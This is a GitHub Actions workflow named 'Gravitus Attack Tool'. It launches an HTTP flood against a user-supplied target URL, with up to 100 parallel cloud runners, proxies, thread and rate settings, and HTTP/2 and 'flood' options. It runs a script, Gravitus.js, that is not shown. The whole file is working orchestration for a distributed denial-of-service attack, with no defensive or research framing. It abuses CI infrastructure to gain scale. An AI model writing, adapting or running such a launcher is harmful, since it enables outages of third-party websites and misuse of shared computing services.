name: Gravitus Attack Tool

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target URL'
        required: true
        default: 'https://example.com'
      method:
        description: 'HTTP Method (GET/POST)'
        required: true
        default: 'GET'
      duration:
        description: 'Duration in seconds'
        required: true
        default: '120'
      threads:
        description: 'Number of threads'
        required: true
        default: '94'
      rate:
        description: 'Rate limit'
        required: true
        default: '10'
      proxy_file:
        description: 'Proxy file name'
        required: true
        default: 'proxy.txt'
      options:
        description: 'Options (flood,debug,full,http2) - Example: flood,debug,full,http2'
        required: true
        default: 'flood,debug,full,http2'
      parallel_runs:
        description: 'Number of parallel runs'
        required: true
        default: '100'

jobs:
  generate-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
    - name: Generate matrix
      id: set-matrix
      run: |
        MATRIX=$(printf '{"run":['; for i in $(seq 1 ${{ inputs.parallel_runs }}); do printf '"%d"' $i; if [ $i -lt ${{ inputs.parallel_runs }} ]; then printf ','; fi; done; printf ']}')
        echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  run-gravitus:
    needs: generate-matrix
    runs-on: ubuntu-latest
    strategy:
      matrix: ${{ fromJson(needs.generate-matrix.outputs.matrix) }}
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '18'

    - name: Install dependencies
      run: |
        npm install puppeteer-real-browser
        npm install hpack
        npm install colors
        npx @puppeteer/browsers install chrome@stable

    - name: Run Gravitus Attack
      run: |
        # Parse options
        OPTIONS="${{ inputs.options }}"
        FLOOD_FLAG=""
        DEBUG_FLAG=""
        FULL_FLAG=""
        HTTP_VERSION="1"
        
        if [[ "$OPTIONS" == *"flood"* ]]; then
          FLOOD_FLAG="--flood"
        fi
        
        if [[ "$OPTIONS" == *"debug"* ]]; then
          DEBUG_FLAG="--debug"
        fi
        
        if [[ "$OPTIONS" == *"full"* ]]; then
          FULL_FLAG="--full"
        fi
        
        if [[ "$OPTIONS" == *"http2"* ]]; then
          HTTP_VERSION="2"
        fi
        
        node Gravitus.js \
          "${{ inputs.method }}" \
          "${{ inputs.target }}" \
          "${{ inputs.duration }}" \
          "${{ inputs.threads }}" \
          "${{ inputs.rate }}" \
          "${{ inputs.proxy_file }}" \
          $FLOOD_FLAG \
          $DEBUG_FLAG \
          $FULL_FLAG \
          --http $HTTP_VERSION

